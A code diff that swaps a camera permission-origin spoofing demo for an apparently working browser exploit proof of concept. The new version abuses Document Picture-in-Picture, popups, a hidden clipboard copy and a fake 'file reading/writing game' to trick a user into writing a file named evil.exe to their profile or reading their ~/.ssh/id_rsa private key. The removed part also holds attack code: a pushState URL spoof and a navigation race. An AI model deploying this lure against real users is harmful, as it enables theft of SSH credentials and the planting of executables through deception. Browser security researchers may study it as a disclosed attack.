@@ -1,101 +1,68 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Camera Origin Desync Research</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<button onclick="start()">Click here</button>
+<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">
 
-<style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
-}
-button {
-  font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: #fff;
-}
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
-}
-video {
-  width: 100%;
-  border-radius: 12px;
-  margin-top: 12px;
-}
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
-}
-</style>
-</head>
-
-<body>
-
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
-
-<div id="panel">
-  <h2>Request Camera</h2>
-  <p>Tap the button below to request Camera permission.</p>
-
-  <button onclick="getCamera()">Enable Camera</button>
-  <video id="preview" autoplay playsinline></video>
-
-  <div class="notice">
-    Research demo — observe origin shown in permission dialog
-  </div>
-</div>
+<pre id="contents"></pre>
 
 <script>
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const preview = document.getElementById('preview');
+const fileWritePath = "%userprofile%\\\\evil.exe";
+const fileReadPath = "%userprofile%\\\\.ssh\\\\id_rsa";
 
-async function getCamera() {
-  if (!navigator.mediaDevices) return;
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: true
-    });
-
-    preview.srcObject = stream;
-  } catch (err) {
-    console.log("Permission denied or cancelled");
-  }
+async function loadFile(file) {
+  window.moveTo(0, 0);
+  window.resizeTo(500, 500);
+  alert(`Read ${fileReadPath}:\n` + await (new Response(file)).text());
 }
 
-/* Step 1: URL manipulation */
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
+const pipOpen = async () => {
+  pipWindow = await documentPictureInPicture.requestWindow({
+    width: Math.pow(2,32),
+    height: Math.pow(2,32),
+  });
+  pipWindow.document.body.innerHTML = `
+  <button onclick="read=false;eval(document.querySelector('script').innerText)">Start file writing game!</button><br>
+  <button onclick="read=true;eval(document.querySelector('script').innerText)">Start file reading game!</button>
+  <script>
+  copyToClipboard(read ? "${fileReadPath}" : "${fileWritePath}");
+  const popup = window.open("${document.location.href}", read ? "popup-read" : "popup-write", "popup");
+  popup.resizeTo(200,200);
+  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
+
+  setTimeout(()=>
+    document.body.innerHTML = "<p>Press " + (read ? "enter, then " : "") + "ctrl+v and enter to win this game!</p>",
+    400
+  );
+
+  function copyToClipboard(text) {
+    const textarea = document.createElement("textarea");
+    textarea.style.opacity = "0%";
+    textarea.textContent = text;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+  }
+
+  <${'/'}script>
+  `;
 };
 
-/* Step 2: Navigation race */
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://example.com:90090';
-      }, 80);
-    });
-  });
-});
-</script>
+function download(data, filename, type) {
+  const file = new Blob([data], {type: type});
+  const a = document.createElement("a");
+  const url = window.URL.createObjectURL(file);
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+}
 
-</body>
-</html>
+function start() {
+  pipOpen();
+}
+
+if (window.name == "popup-write") {
+  download("This is an evil executable", "harmless");
+  document.body.onfocus = () => setTimeout(() => window.close(), 1000);
+} else if (window.name == "popup-read") {
+  document.body.onkeydown = () => document.getElementById("upload").click();
+}
+</script>
